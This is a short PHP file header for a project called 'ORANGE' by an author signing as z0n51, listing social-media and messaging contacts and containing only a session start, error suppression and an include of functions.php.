<?php

/**
 * @link              https://www.z0n51.com/
 * @since             03/08/2020
 * @package           ORANGE
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      ORANGE
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

session_start();
error_reporting(0);
include_once 'functions.php';
?>